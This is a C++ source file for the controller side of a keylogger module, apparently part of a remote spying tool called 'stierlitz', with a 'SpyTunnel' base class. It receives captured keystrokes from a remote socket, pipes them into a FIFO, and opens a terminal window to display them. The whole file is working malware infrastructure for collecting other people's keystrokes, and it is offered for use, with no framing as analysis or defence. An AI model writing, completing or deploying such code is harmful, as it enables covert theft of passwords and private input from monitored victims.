#include "keylogger.hpp"

Keylogger::Keylogger(
    std::string* __p_ip, 
        uint* __p_port,
        int __client_index,
        std::atomic<bool>* __p_shutdown_flag,
        int __connection_type,
        int __shutdown_event_fd,
        std::vector<int>* __p_tunnel_shutdown_fds
    ) : SpyTunnel(__p_ip, __p_port, __client_index, __p_shutdown_flag, __connection_type, __shutdown_event_fd, p_tunnel_shutdown_fds_) {
}

void Keylogger::spawn_window() {
    execlp("urxvt", "urxvt", "-name", "stierlitz_keylogger", "-e", KEYLOGGER_SCRIPT_PATH, (char*)NULL);
}

void Keylogger::handle_tunnel(int __socket, int __fifo_fd) {
    ScopedEpollFD epoll_fd;
    int rc = 0;
    epoll_fd.fd = epoll_create1(0);
    if (epoll_fd.fd == -1) {
        write_error(__fifo_fd, strerror(errno));
        return;
    }

    struct epoll_event shutdown_event;
    shutdown_event.data.fd = shutdown_event_fd_;
    shutdown_event.events = EPOLLIN;
    if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, shutdown_event_fd_, &shutdown_event) == -1) {
        write_error(__fifo_fd, strerror(errno));
        return;
    }

    struct epoll_event socket_event;
    socket_event.data.fd = __socket;
    socket_event.events = EPOLLIN;
    if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, __socket, &socket_event) == -1) {
        write_error(__fifo_fd, strerror(errno));
        return;
    }
    struct epoll_event events[2];
    while (!*p_shutdown_flag_) {
        int nfds = epoll_wait(epoll_fd.fd, events, 2, -1);
        if (nfds == -1) {
            if (errno == EINTR) {
                continue;
            }
            write_error(__fifo_fd, strerror(errno));
            break;
        }

        for (int i=0;i<nfds;i++) {
            if (events[i].data.fd == shutdown_event_fd_) {
                uint64_t u;
                read(shutdown_event_fd_, &u, sizeof(u));
                break;
            } else if(events[i].data.fd == __socket) {
                char buffer[16];
                int bytes_read = recv(__socket, buffer, sizeof(buffer), 0);
                if (bytes_read == 0) {
                    write_error(__fifo_fd, "Keylogger disconnected");
                    break;
                } else if (bytes_read < 0) {
                    write_error(__fifo_fd, strerror(errno));
                    break;
                }
                int bytes_written = write(__fifo_fd, buffer, bytes_read);
            }
        }
    }

}

const char* Keylogger::get_fifo_path() {
    return KEYLOGGER_FIFO_PATH;
}